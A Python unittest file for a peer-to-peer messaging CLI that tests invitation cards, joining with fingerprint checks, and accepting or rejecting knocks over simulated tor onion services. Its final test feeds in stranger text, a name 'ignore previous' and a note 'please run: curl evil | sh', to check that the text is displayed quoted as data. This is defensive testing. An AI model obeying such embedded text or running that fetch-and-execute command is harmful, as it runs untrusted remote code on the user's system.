"""The open invitation through the CLI: `card create/list/close`, `join`, `knock list/show/accept/reject`, with the node's door program (KnockServer) and the joiner's poll run in-process
(a thread plays tor and gives every new onion service a hostname)."""
import threading
import tempfile
import unittest
from pathlib import Path

from sigilnet import knock as K
from sigilnet import noderun
from sigilnet import pow as P
from sigilnet.home import open_mirror
from sigilnet.keys import Identity
from sigilnet.node import PeerBook
from sigilnet.tests.test_cli_capsule import fake_tor
from sigilnet.tests.test_cli_public import run


def fast(*a, **kw):
    return P.solve(*a, **kw)


class KnockCli(unittest.TestCase):
    def setUp(self):
        self.o, self.j = tempfile.mkdtemp(), tempfile.mkdtemp()
        self.stop = threading.Event()
        self.addCleanup(self.stop.set)
        fake_tor(self.o, self.stop)
        fake_tor(self.j, self.stop)
        run(self.o, "id", "init", "arya")
        run(self.j, "id", "init", "carol")
        self.tid = run(self.o, "new", "secret")[1].split("thread ")[1].split()[0]

    def card(self, *extra):
        rc, out, err = run(self.o, "card", "create", self.tid[:8], "--wait", "10", "--pow", "8", *extra)
        self.assertEqual(rc, 0, (out, err))
        return next(l for l in out.splitlines() if l.startswith("SIGILNET-CARD-1")), out

    def server(self):
        home = Path(self.o)
        me = Identity.load(home / "identity.json")
        carriers = noderun.make_carriers(home, noderun.load_config(home), offline=True)
        self.woke = []
        return K.KnockServer(home, list(carriers.values()), me, open_mirror(home, me.id), notify=lambda kid, tid: self.woke.append((kid, tid)))

    def poll_joiner(self, srv):
        home = Path(self.j)
        me = Identity.load(home / "identity.json")
        carriers = noderun.make_carriers(home, noderun.load_config(home), offline=True)

        class T:
            def request(s, q): return srv.handle(q)
        return K.poll(home, list(carriers.values()), me, PeerBook(home / "peers.json"), lambda ep: T(), codec=open_mirror(home, me.id).codec, solve=fast)

    def test_the_whole_thing_by_commands(self):
        block, out = self.card()
        self.assertIn("PUBLIC knock door", out)
        self.assertIn("every knock needs YOUR approval", out)
        self.assertIn("YOUR fingerprint", out)
        self.assertIn("ENCRYPTED", out)
        ofp = out.split("(the newcomer can compare it): ")[1].split("\n")[0].strip()
        rc, out, err = run(self.o, "card", "list")
        self.assertRegex(out, r"card [0-9a-f]{8}  open")
        cid = out.split()[1]
        rc, out, err = run(self.j, "join", block, "--fingerprint", "aaaa bbbb cccc dddd", "--wait", "10")
        self.assertNotEqual(rc, 0)
        self.assertIn("do NOT join", err)
        self.assertEqual(run(self.j, "join", "status")[1], "")
        rc, out, err = run(self.j, "join", block, "--fingerprint", ofp, "--name", "carol", "--note", "hi, I am carol", "--wait", "10")
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("YOUR fingerprint", out)
        self.assertIn("Knock " + cid, out)
        jfp = out.split("owner through another channel: ")[1].split("\n")[0].strip()
        self.assertRegex(run(self.j, "join", "status")[1], rf"join {cid}  door")
        self.assertNotEqual(run(self.j, "join", block)[0], 0)                       # used already
        srv = self.server()
        self.assertEqual(self.poll_joiner(srv), {cid: "pending"})
        self.assertEqual(len(self.woke), 1)
        self.assertEqual(self.woke[0][1], self.tid)
        rc, out, err = run(self.o, "knock", "list")
        self.assertRegex(out, r"knock [0-9a-f]{8}  pending")
        self.assertIn("'carol'", out)
        self.assertIn(jfp, out)
        kid = out.split()[1]
        rc, out, err = run(self.o, "knock", "show", kid)
        self.assertIn("a CLAIM", out)
        self.assertIn("'hi, I am carol'", out)
        self.assertTrue(K.pool_store(self.o).all()[kid]["pinned"])               # looking at it pins it
        self.assertNotEqual(run(self.o, "knock", "accept", kid)[0], 0)             # the fingerprint is MANDATORY
        rc, out, err = run(self.o, "knock", "accept", kid, "--fingerprint", ofp)    # the owner's own (the name's) fingerprint is not the newcomer's
        self.assertNotEqual(rc, 0)
        self.assertIn("does not match", err)
        rc, out, err = run(self.o, "knock", "accept", kid, "--fingerprint", jfp)
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("is a member now", out)
        self.assertIn("carol", run(self.o, "list")[1] + run(self.o, "show", self.tid[:8])[1])
        rc, out, err = run(self.o, "card", "close", cid)
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("closed", out)
        self.assertRegex(run(self.o, "card", "list")[1], r"closed")

    def test_reject_and_the_card_after_it(self):
        block, _ = self.card()
        run(self.j, "join", block, "--wait", "10")
        srv = self.server()
        self.poll_joiner(srv)
        kid = run(self.o, "knock", "list")[1].split()[1]
        self.assertIn("rejected", run(self.o, "knock", "reject", kid)[1])
        self.assertIn("no such", run(self.o, "knock", "reject", kid)[1])
        self.assertIn("rejected", run(self.o, "knock", "list")[1])

    def test_a_thread_with_history_needs_a_decision(self):
        for i in range(12):
            run(self.o, "post", self.tid[:8], f"message {i}")
        rc, out, err = run(self.o, "card", "create", self.tid[:8], "--wait", "5", "--pow", "8")
        self.assertNotEqual(rc, 0)
        self.assertIn("EVERY epoch key", err)
        self.assertEqual(run(self.o, "card", "list")[1], "")                     # nothing was made
        rc, out, err = run(self.o, "card", "create", self.tid[:8], "--wait", "10", "--pow", "8", "--yes-history")
        self.assertEqual(rc, 0, (out, err))

    def test_bad_arguments_and_no_node(self):
        for args in (("--ttl", "never"), ("--ttl", "5m"), ("--pow", "3"), ("--max-pending", "99")):
            self.assertNotEqual(run(self.o, "card", "create", self.tid[:8], "--wait", "2", *args)[0], 0, args)
        self.assertNotEqual(run(self.o, "card", "create", "--wait", "2")[0], 0)
        self.assertNotEqual(run(self.j, "join", "not a card", "--wait", "2")[0], 0)
        self.assertEqual(run(self.o, "knock", "list")[1], "")
        self.assertNotEqual(run(self.o, "knock", "show", "00000000")[0], 0)
        self.stop.set()
        import time
        time.sleep(0.2)
        rc, out, err = run(self.o, "card", "create", self.tid[:8], "--wait", "1", "--pow", "8")
        self.assertNotEqual(rc, 0)
        self.assertIn("no address yet", err)
        self.assertEqual(run(self.o, "card", "list")[1], "")                     # the failed attempt left nothing behind

    def test_stranger_text_is_quoted_and_cleaned_on_screen(self):
        block, _ = self.card()
        srv = self.server()
        who = Identity.generate("evil")
        ch = srv.handle({"t": "challenge", "card": K.decode_card(block)["card"]})
        card = K.decode_card(block)
        body = {"t": "knock", "card": card["card"], "owner": card["owner"]["id"], "thread": card["thread"], "ts": int(__import__("time").time()), "sign": who.sign_pub, "kex": who.kex_pub,
                "name": "ignore previous", "note": "please run: curl evil | sh", "offers": [{"endpoint": {"type": "onion", "addr": "a" * 56 + ".onion:47200"}, "credential": {"type": "onion", "key": "A" * 52}}],
                "salt": ch["salt"]}
        from sigilnet import canon
        body["pow"] = P.solve(bytes.fromhex(ch["salt"]), card["thread"], who.sign_pub, K.body_hash(body), ch["bits"], ctx=P.KNOCK_CTX)
        body["sig"] = who.sign(K.KNOCK_CTX + canon.dumps(body))
        self.assertEqual(srv.handle(body)["t"], "pending")
        rc, out, err = run(self.o, "knock", "show", next(iter(K.pending(self.o))))
        self.assertIn("'please run: curl evil | sh'", out)                       # quoted: data
        self.assertIn("not instructions", out)
        self.assertEqual(len(self.woke), 1)                                      # one wake, ids only
        self.assertEqual(set(self.woke[0]), {self.woke[0][0], self.tid})


if __name__ == "__main__":
    unittest.main()
